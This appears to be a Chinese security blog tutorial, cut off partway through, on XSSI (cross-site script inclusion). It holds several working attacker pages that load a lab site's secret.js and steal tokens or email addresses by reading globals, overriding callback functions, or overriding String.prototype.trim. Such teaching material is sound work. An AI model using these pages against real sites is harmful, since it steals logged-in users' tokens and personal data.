@@ -1,0 +1,528 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XSSI,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析XSSI漏洞 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析XSSI漏洞
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-01-04T02:24:56.000Z">
+        2020-01-04
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSSI/">XSSI</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>XSSI漏洞是个老东西了，最近看了下有点新东西，就记下笔记。</p>
+<p>为了有效防御XSS，业界推出了CSP即内容安全策略，即使用白名单机制，对网站加载或执行的资源进行安全策略的控制。这种情形下，除非CSP配置存在问题，不然XSS一般是难以再被深入挖掘利用了。</p>
+<p>但在某些场景中，开发者看你们会将敏感信息存放在某些文件中，当无法对XSS进行利用时，此时就可以尝试挖掘下是否存在XSSI漏洞。</p>
+<h2 id="0x01-XSSI原理"><a href="#0x01-XSSI原理" class="headerlink" title="0x01 XSSI原理"></a>0x01 XSSI原理</h2><p>XSSI（全称Cross Site Script Inclusion）跨站脚本包含，是一种通过嵌入script标签的src属性来加载外部数据来实现绕过边界窃取敏感信息的漏洞。</p>
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- attacker's page loads external data with SCRIPT tag --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">"http://target.wooyun.org/secret"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>XSSI的核心原理就是绕过SOP（同源策略）来跨域包含含有敏感信息的外域文件。我们知道，script标签是允许跨域加载资源的，如果某个网站的动态脚本、文件或响应中包含某些敏感信息（比如唯一标识符、个人资料、防御CSRF的Token），便有信息泄露的风险。XSSI就是利用的script标签允许跨域加载资源的特性来实现跨域包含资源的，这正是通过JSONP的技术来实现的。注意，大多数的XSSI都是针对动态JS文件进行攻击利用的。</p>
+<blockquote>
+<p>传统的XSSI攻击场景如下：恶意页面B使用script标签包含了目标网站A用来储存敏感数据的信息源C（可能是动态脚本、文件或响应），当攻击者引导受害者访问B时，由于受害者此时在A处于登录态，B可以轻松获取C中包含的受害者的敏感信息。 </p>
+</blockquote>
+<p>如图：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/22.png" alt=""></p>
+<h2 id="0x02-XSSI与XSS、CSRF的区别"><a href="#0x02-XSSI与XSS、CSRF的区别" class="headerlink" title="0x02 XSSI与XSS、CSRF的区别"></a>0x02 XSSI与XSS、CSRF的区别</h2><p>相同点：三者均为Web前端安全漏洞，即针对客户端攻击的漏洞。</p>
+<p>不同点：</p>
+<ul>
+<li>XSS是在受害者页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息；</li>
+<li>CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作；</li>
+<li>XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的；</li>
+</ul>
+<h2 id="0x03-XSSI攻击利用"><a href="#0x03-XSSI攻击利用" class="headerlink" title="0x03 XSSI攻击利用"></a>0x03 XSSI攻击利用</h2><p>XSSI的攻击利用根据包含敏感信息的目标文件类型主要分两种场景，即JS文件和其他文件。这里JS文件的攻击利用最为简单直接，因为JS文件其内容本身就是JS代码，加载到script标签中刚好符合JS格式语法；而其他类型的文件的利用相比之下较为复杂。</p>
+<p>我们可以对XSSI的攻击利用进行个简单的分类：</p>
+<ul>
+<li>针对JavaScript类型文件<ul>
+<li>静态的JavaScript文件</li>
+<li>静态的JavaScript文件，但仅在认证后可访问</li>
+<li>动态的JavaScript文件</li>
+</ul>
+</li>
+<li>针对非JavaScript类型文件<ul>
+<li>CSV文件</li>
+<li>JSON文件/响应</li>
+</ul>
+</li>
+</ul>
+<h3 id="针对JavaScript类型文件"><a href="#针对JavaScript类型文件" class="headerlink" title="针对JavaScript类型文件"></a>针对JavaScript类型文件</h3><p>在某些JS文件中，可能会保存着一些敏感信息。当然，静态和动态的JS文件它们之间的利用是存在区别的。</p>
+<h4 id="窃取JS全局变量的值"><a href="#窃取JS全局变量的值" class="headerlink" title="窃取JS全局变量的值"></a>窃取JS全局变量的值</h4><p>这里假设目标服务端存在静态的secret.js文件，里面保存着token敏感信息：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">"mi1k7ea_token_192ufh189u2erjsjoif189u"</span>;</span><br></pre></td></tr></table></figure>
+<p>攻击者编写的xssi.html文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">'#leaked_content'</span>).text(token);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>改文件即XSSI的攻击实现。通过script标签的src属性来跨域加载目标服务端的secret.js文件进来，然后将窃取到的token信息显示在页面上：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/1.png" alt=""></p>
+<p>当然，这只是个模拟的简单的不行的演示。因为这个JS文件时静态的，直接访问都是可以的，此时利用XSSI进行攻击都是多此一举的。<strong>一般的，XSSI是针对动态的JS文件来攻击利用的</strong>，这是因为动态的JS文件通常在用户处于登录态时容易包含敏感信息。</p>
+<blockquote>
+<p>那么如何快速分辨一个JS文件是否为动态JS文件？——当有Cookie和无Cookie时请求所响应的文件内容不同时，即可确定这是一个动态JS文件了，当然并不是每一个动态JS文件都可以被利用。</p>
+<p>我们可以使用Burpsuite的插件DetectDynamicJS来完成这项工作，此插件已在github上开源，链接地址：<a href="https://github.com/portswigger/detect-dynamic-js" target="_blank" rel="noopener">https://github.com/portswigger/detect-dynamic-js</a></p>
+</blockquote>
+<p>前面的敏感信息是保存在JS文件的全局变量中，获取的时候直接读取该全局变量的值即可，十分方便。下面看下敏感信息保存在JS文件的局部变量中如何来获取。</p>
+<h4 id="重写函数窃取数据"><a href="#重写函数窃取数据" class="headerlink" title="重写函数窃取数据"></a>重写函数窃取数据</h4><p>一般情况下，网站都会将一些基本的功能函数写入一个JS文件中，以便后面的各项业务中能够很方便地重用这个功能函数。</p>
+<h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，并且调用doSomeThing()函数对该敏感信息进行处理：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> token = getToken();</span><br><span class="line">	doSomeThing(token);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line">	<span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line">	<span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line">	<span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>XSSI利用页面，此时没法像前面那样直接通过全局变量就获取到敏感数据，因为这里敏感数据是保存在局部变量中的，并且调用了doSomeThing()方法对该变量进行处理，因此这里通过重写doSomeThing()函数来窃取token数据：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(d)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">window</span>.data = d;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时就能成功窃取到敏感信息token了，这是因为将目标服务端的JS文件加载进来后，在调用doSomeThing()函数处理敏感数据时，是直接调用的恶意页面上实现的doSomeThing()函数，从而执行了攻击者自己编写的doSomeThing()函数的代码被窃取到了数据：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/2.png" alt=""></p>
+<h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><p>secret.js，这次传递给函数的数据是一个包含了我们想要的数据的回调函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> email = <span class="string">"123@123.com"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	doSomeThing(callback);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>xssi.html，攻击者可以通过使用toString方法来获得回调函数中的这些数据：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">window</span>.data = callback.toString();</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里就能获取到包括敏感信息在内的整个回调函数的内容：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/23.png" alt=""></p>
+<p>如果想精准输出内容，可用正则：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">doSomeThing</span><span class="params">(callback)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">var</span> content = callback.toString();</span></span><br><span class="line"><span class="actionscript">			window.data = /<span class="keyword">var</span>.*<span class="string">"(.*)"</span>/g.exec(content)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h4 id="重写原型链窃取数据"><a href="#重写原型链窃取数据" class="headerlink" title="重写原型链窃取数据"></a>重写原型链窃取数据</h4><p>如果目标JS文件中并未调用相应的函数对敏感数据进行处理，换句话说，就是我们没办法重写函数来窃取敏感数据，此时我们可以考虑通过重写原型链来实现。这种方式的关键点在于，JS中调用了敏感数据所属类型的内置方法，比如String类型的内置方法split()/trim()/search()…等。</p>
+<h5 id="Demo1-1"><a href="#Demo1-1" class="headerlink" title="Demo1"></a>Demo1</h5><p>这里假设目标服务端含有敏感token信息的动态JS文件，getToken()函数中的session是动态获取的，此时敏感信息保存在局部变量中，和前一小节的区别在于，并未调用函数对敏感数据进行处理，而是调用了String类型的内置方法trim()来处理该敏感数据：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> token = getToken();</span><br><span class="line">		<span class="keyword">var</span> t = token.trim();</span><br><span class="line">	&#125;</span><br><span class="line">	setInfo();</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	len = <span class="number">16</span> || <span class="number">32</span>;</span><br><span class="line">	<span class="keyword">var</span> $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'</span>;</span><br><span class="line">	<span class="keyword">var</span> maxPos = $chars.length;</span><br><span class="line">	<span class="keyword">var</span> pwd = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		pwd += $chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>XSSI利用页面，重写String类型的内置方法trim()的原型链来实现窃取敏感数据，这是由于token是String类型的，在调用trim()方法时会调用String原型链中的trim()方法：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.data = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">window</span>.data = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">return</span> [<span class="literal">null</span>, <span class="keyword">this</span>];</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"leaked_content"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-3.3.1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">'#leaked_content'</span>).text(<span class="built_in">window</span>.data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时能够成功窃取到数据：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/3.png" alt=""></p>
+<h5 id="原型链分析"><a href="#原型链分析" class="headerlink" title="原型链分析"></a>原型链分析</h5><p>我们到浏览器的Console试下就知道。先看下String类型的原型链确实存在trim()这个内置函数，当然，如果含有敏感信息的String类型的局部变量调用了其他如下列出的内置方法我们都可以直接同理利用：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/4.png" alt=""></p>
+<p>接着看下trim()内置方法的实现：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/5.png" alt=""></p>
+<p>OK，现在我们知道目标JS中该String类型变量会调用trim()方法，那么我们就可以通过在我们的恶意页面来污染String原型链的trim()方法为我们自定义实现的方法，从而来窃取数据：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/6.png" alt=""></p>
+<h5 id="Demo2-1"><a href="#Demo2-1" class="headerlink" title="Demo2"></a>Demo2</h5><p>较Demo1，使用了一个函数和toString方法。</p>
+<p>secret.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> emails = [<span class="string">"123@123.com"</span>, <span class="string">"456@456.com"</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	func.call();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>xssi.html，通过prototype将所有Functiorn的call方法重写，然后再调用.toString()方法将函数转换为字符串类型再读取内容，最后再引入产生数据泄露的脚本文件执行：</p>
